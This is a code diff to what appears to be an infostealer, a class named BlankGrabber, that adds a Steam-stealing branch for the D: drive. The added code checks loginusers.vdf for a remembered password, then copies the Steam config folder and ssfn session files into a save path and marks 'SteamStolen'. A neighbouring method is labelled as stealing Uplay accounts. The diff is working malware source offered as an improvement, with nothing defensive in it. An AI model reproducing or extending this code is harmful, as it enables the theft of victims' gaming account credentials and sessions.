@@ -1056,6 +1056,25 @@ class BlankGrabber:
                                     self.SteamStolen = True
                         except Exception:
                             pass
+            else:
+                steamPath = os.path.join("D:\\", "Program Files (x86)", "Steam") #added for Steam checks in the D: Drive. (potentially more hits)
+                steamConfigPath = os.path.join(steamPath, "config") #could've been written better, but it is functional.
+                if os.path.isdir(steamConfigPath):
+                    loginFile = os.path.join(steamConfigPath, "loginusers.vdf")
+                    if os.path.isfile(loginFile):
+                        with open(loginFile) as file:
+                            contents = file.read()
+                        if '"RememberPassword"\t\t"1"' in contents:
+                            try:
+                                os.makedirs(saveToPath, exist_ok= True)
+                                shutil.copytree(steamConfigPath, os.path.join(saveToPath, "config"), dirs_exist_ok= True)
+                                for item in os.listdir(steamPath):
+                                    if item.startswith("ssfn") and os.path.isfile(os.path.join(steamPath, item)):
+                                        shutil.copy(os.path.join(steamPath, item), os.path.join(saveToPath, item))
+                                        self.SteamStolen = True
+                            except Exception:
+                                pass
+
     
     @Errors.Catch
     def StealUplay(self) -> None: # Steals Uplay accounts
